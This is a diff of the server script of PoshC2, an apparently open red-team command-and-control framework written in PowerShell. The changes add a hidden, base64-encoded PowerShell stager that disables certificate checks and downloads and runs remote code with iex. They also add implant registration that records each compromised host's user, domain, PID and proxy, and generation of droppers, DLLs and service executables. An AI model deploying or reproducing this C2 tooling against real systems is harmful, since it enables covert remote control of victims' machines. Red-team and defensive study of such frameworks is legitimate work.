@@ -1,4 +1,4 @@
-# Written by @benpturner and @davehardy20
+ # Written by @benpturner and @davehardy20
 function C2-Server {
 Param($PoshPath, $RestartC2Server)
 
@@ -38,7 +38,6 @@ $global:newdir = $null
 $ipv4address = $null
 $randomuriarray = @()
 $taskiddb = 1 
-gc $PoshPath\C2-Payloads.ps1 | out-string | iex
 
 # used to generate random uri for each implant
 function Get-RandomURI 
@@ -243,11 +242,11 @@ function PatchDll {
     param($dllBytes, $replaceString, $Arch)
 
     if ($Arch -eq 'x86') {
-        $dllOffset = 0x00003640
-        $dllOffset = $dllOffset +8
+        $dllOffset = 0x00012D80
+        #$dllOffset = $dllOffset +8
     }
     if ($Arch -eq 'x64') {
-        $dllOffset = 0x00004470
+        $dllOffset = 0x00016F00
     }
 
     # Patch DLL - replace 5000 A's
@@ -568,6 +567,7 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
         FirstSeen TEXT,
         LastSeen TEXT,
         PID TEXT,
+        Proxy TEXT,
         Arch TEXT,
         Domain TEXT,
         Alive TEXT,
@@ -671,10 +671,14 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
     
     Write-Host -Object "For " -NoNewline
     Write-Host -Object "Red Teaming " -NoNewline -ForegroundColor Red
-    Write-Host -Object "activities, use the following payloads:" 
-   
+    Write-Host -Object "activities, use the following payloads:"
+    
+    Import-Module $PoshPath\C2-Payloads.ps1 
+    $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport
+    $payload = createrawpayload -command $command
+
     if ($enablepayloads -eq "Yes") {
-        gc $poshPath\C2-Payloads.ps1 |Out-String | iex
+        # create all payloads
         CreatePayload
         CreateStandAloneExe
         rg_sct
@@ -685,20 +689,15 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
         CreateLink
         CreateServiceExe
         CreateJavaPayload
-        Start-Sleep 3 
         poshjs
+        createdll
     } else {
-        
         # create limited payloads
-        gc $poshPath\C2-Payloads.ps1 | Out-String | iex
         CreatePayload
         CreateStandAloneExe
         rg_sct
         cs_sct
         CreateServiceExe
-        
-    
-        Start-Sleep 3
     }
 
     
@@ -813,7 +812,7 @@ while ($listener.IsListening)
         $key = Create-AesKey
         $endpointip = $request.RemoteEndPoint
         $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
-        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)
+        $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
 
         ## add anti-ir and implant safety mechanisms here!
         #
@@ -833,8 +832,8 @@ while ($listener.IsListening)
             } catch {}
         }
 
-        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
-        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'
+        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Proxy, Arch, Domain, Alive, Sleep, ModsLoaded)
+        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Proxy, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'
 
         Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
             RandomURI = $randomuri
@@ -845,6 +844,7 @@ while ($listener.IsListening)
             FirstSeen = "$(Get-Date)"
             LastSeen  = "$(Get-Date)"
             PID  = $im_pid
+            Proxy = $im_proxy
             Arch = $im_arch
             Domain = $im_domain
             Alive = "Yes"
@@ -1121,7 +1121,7 @@ $message =[Convert]::ToBase64String($Bytes)
 
         $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
 
-        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)
+        $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
 
         ## add anti-ir and implant safety mechanisms here!
         #
@@ -1129,9 +1129,9 @@ $message =[Convert]::ToBase64String($Bytes)
         # if ($im_domain -ne "safenet") { do something }
         #
         ## add anti-ir and implant safety mechanisms here!
-
+        $im_firstseen = $(Get-Date)
         Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
-        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
+        Write-Host "$endpointip | URL:$im_proxy | Time:$im_firstseen | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
 
         # optional clockwork sms on new implant
         $mobilenumber = ""
@@ -1157,7 +1157,7 @@ $message =[Convert]::ToBase64String($Bytes)
             Hostname  = $im_computername
             IpAddress = $request.RemoteEndPoint
             Key       = $key
-            FirstSeen = "$(Get-Date)"
+            FirstSeen = $im_firstseen
             LastSeen  = "$(Get-Date)"
             PID  = $im_pid
             Arch = $im_arch
@@ -1194,7 +1194,18 @@ $message =[Convert]::ToBase64String($Bytes)
 
 $key="' + "$key"+'"
 $sleeptime = '+$defaultbeacon+'
-$payload = "' + "$payload"+'"
+
+$payloadclear = @"
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
+function Get-Webclient {${function:Get-Webclient}} function Primer {${function:primer}}
+`$primer = primer
+if (`$primer) {`$primer| iex} else {
+start-sleep 10
+primer | iex }
+"@
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadclear)
+$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e "+[Convert]::ToBase64String($bytes)
+$payload = $payloadraw -replace "`n", ""
 
 function getimgdata($cmdoutput) {
     $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
